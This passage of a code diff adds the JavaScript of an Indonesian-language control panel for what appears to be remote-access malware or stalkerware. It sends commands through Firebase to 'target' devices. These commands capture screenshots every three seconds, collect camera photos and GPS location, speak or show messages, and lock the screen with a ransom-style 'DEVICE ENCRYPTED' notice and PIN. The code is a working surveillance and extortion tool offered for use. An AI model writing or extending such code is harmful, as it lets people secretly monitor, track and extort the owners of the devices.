+                document.getElementById('locationResult').innerHTML = `<div class="location-coord">📍 ${res.data.lat}, ${res.data.lng} (Akurasi: ${res.data.accuracy || '?'}m)</div><a href="https://www.google.com/maps?q=${res.data.lat},${res.data.lng}" target="_blank" class="map-link">🗺️ BUKA GOOGLE MAPS</a>`;
+                addLog(`[📍] LOKASI: ${res.data.lat}, ${res.data.lng}`, 'success');
+            }
+            if (res && res.command === 'get_notif' && res.data) {
+                document.getElementById('notifResult').innerHTML = `<div style="color:#00ff88;">✅ Notifikasi: ${res.status === 'success' ? 'Diizinkan' : 'Ditolak'}</div>`;
+            }
+            if (res && res.command === 'speak' && res.data) {
+                document.getElementById('ttsResult').innerHTML = `<div style="color:#00ff88;">✅ Suara terkirim: "${res.data.text}"</div>`;
+                addLog(`[🔊] SUARA TERKIRIM: ${res.data.text}`, 'success');
+            }
+            db.ref(`responses/${id}`).remove();
+        });
+    }
+
+    function updateCameraResult(photos) {
+        const container = document.getElementById('cameraResult');
+        if(!photos || Object.keys(photos).length === 0) { container.innerHTML = '<div style="color:#88aaff;">Belum ada foto</div>'; return; }
+        let html = '';
+        const sorted = Object.entries(photos).sort((a,b)=>parseInt(b[0])-parseInt(a[0]));
+        for(const [timestamp,photo] of sorted.slice(0,5)){
+            html += `<div style="position:relative;"><img src="${photo.image}" onclick="showPhoto('${photo.image}')" style="width:80px;height:80px;object-fit:cover;border-radius:8px;"><button class="delete-result-btn" onclick="deleteCameraPhoto('${timestamp}', event)">✕</button></div>`;
+        }
+        container.innerHTML = html;
+    }
+
+    async function deleteCameraPhoto(timestamp, event) { event.stopPropagation(); if(confirm('Hapus foto ini?')){ await db.ref(`targets/${currentTargetId}/photos/${timestamp}`).remove(); addLog(`[🗑️] FOTO DIHAPUS`,'success'); } }
+
+    function backToDeviceList() { if(liveInterval) clearInterval(liveInterval); currentTargetId = null; document.getElementById('pageDashboard').style.display = 'none'; document.getElementById('pageDeviceList').style.display = 'block'; updateDeviceList(); }
+    async function sendCommand(cmd, data = null) { if(!currentTargetId){ addLog('❌ PILIH PERANGKAT DULU!','error'); return; } addLog(`[CMD] ${cmd}`,'info'); try{ await db.ref(`commands/${currentTargetId}`).set({command:cmd, data:data, timestamp:Date.now()}); addLog(`✓ ${cmd} TERKIRIM`,'success'); setTimeout(()=>db.ref(`commands/${currentTargetId}`).remove(),10000); }catch(e){ addLog(`✗ GAGAL: ${e.message}`,'error'); } }
+    function sendTextToScreen() { const text = document.getElementById('textToScreen').value; if(text) sendCommand('show_text', {text:text}); }
+    function sendTTS() { const text = document.getElementById('ttsText').value; if(text) sendCommand('speak', {text:text}); }
+    function sendLockScreen() { sendCommand('lock_screen', { title: document.getElementById('lockTitle').value || 'LOCKED BY KINGMU', message: document.getElementById('lockMessage').value || 'DEVICE ENCRYPTED', pin: document.getElementById('lockPin').value || '123456' }); }
+    function sendChatMessage() { const msg = document.getElementById('chatInput').value; if(msg && currentTargetId){ db.ref(`chat/${currentTargetId}`).set({message:msg, from:'owner', timestamp:Date.now()}); const container = document.getElementById('chatMessages'); const msgDiv = document.createElement('div'); msgDiv.className = 'chat-message chat-owner'; msgDiv.innerHTML = `[ADMIN] ${msg}`; container.appendChild(msgDiv); container.scrollTop = container.scrollHeight; document.getElementById('chatInput').value = ''; addLog(`[💬] PESAN TERKIRIM: ${msg}`,'success'); } }
+    function startLiveScreen() { if(liveInterval) clearInterval(liveInterval); liveInterval = setInterval(()=>sendCommand('screenshot'),3000); addLog(`[🖥️] LIVE SCREEN AKTIF (3 detik)`,'success'); }
+    function stopLiveScreen() { if(liveInterval){ clearInterval(liveInterval); liveInterval=null; addLog(`[🖥️] LIVE SCREEN BERHENTI`,'info'); } }
+    function refreshLiveScreen() { sendCommand('screenshot'); }
+    function updatePhotoGallery(photos) { const gallery = document.getElementById('photoGallery'); if(!photos || Object.keys(photos).length===0){ if(gallery) gallery.innerHTML='<div style="color:#88aaff; text-align:center; width:100%;">BELUM ADA FOTO</div>'; return; } let html=''; const sorted=Object.entries(photos).sort((a,b)=>parseInt(b[0])-parseInt(a[0])); for(const [timestamp,photo] of sorted){ html+=`<div class="photo-item"><img src="${photo.image}" onclick="showPhoto('${photo.image}')"><button class="delete-photo" onclick="deletePhoto('${timestamp}', event)">✕</button><div class="photo-time">${new Date(parseInt(timestamp)).toLocaleTimeString()}</div></div>`; } gallery.innerHTML=html; }
+    async function deletePhoto(timestamp,event){ event.stopPropagation(); if(confirm('HAPUS FOTO INI PERMANEN?')){ await db.ref(`targets/${currentTargetId}/photos/${timestamp}`).remove(); addLog(`[🗑️] FOTO DIHAPUS PERMANEN`,'success'); } }
+    function openSubPage(pageId){ document.querySelectorAll('.sub-page').forEach(p=>p.classList.remove('active')); document.getElementById(pageId).classList.add('active'); }
+    function closeSubPage(pageId){ document.getElementById(pageId).classList.remove('active'); }
+    function showPhoto(src){ document.getElementById('modalImage').src=src; document.getElementById('imageModal').style.display='flex'; }
+    function closeModal(){ document.getElementById('imageModal').style.display='none'; }
+
+    window.deleteDevice = deleteDevice;
+    window.clearAllDevices = clearAllDevices;
+    window.selectDevice = selectDevice;
+    window.backToDeviceList = backToDeviceList;
+    window.sendCommand = sendCommand;
+    window.sendTextToScreen = sendTextToScreen;
+    window.sendTTS = sendTTS;
+    window.sendLockScreen = sendLockScreen;
+    window.sendChatMessage = sendChatMessage;
+    window.startLiveScreen = startLiveScreen;
+    window.stopLiveScreen = stopLiveScreen;
+    window.refreshLiveScreen = refreshLiveScreen;
+    window.openSubPage = openSubPage;
+    window.closeSubPage = closeSubPage;
+    window.deletePhoto = deletePhoto;
+    window.showPhoto = showPhoto;
+    window.closeModal = closeModal;
+    window.showUserLogin = showUserLogin;
+    window.showOwnerLogin = showOwnerLogin;
+    window.backToChoice = backToChoice;
+    window.submitLogin = submitLogin;
+    window.createUser = createUser;
+    window.logoutOwner = logoutOwner;
+    window.logoutUser = logoutUser;
+    window.deleteCameraPhoto = deleteCameraPhoto;
+    
+    setInterval(updateDeviceList, 5000);
+</script>
+</body>
+</html>
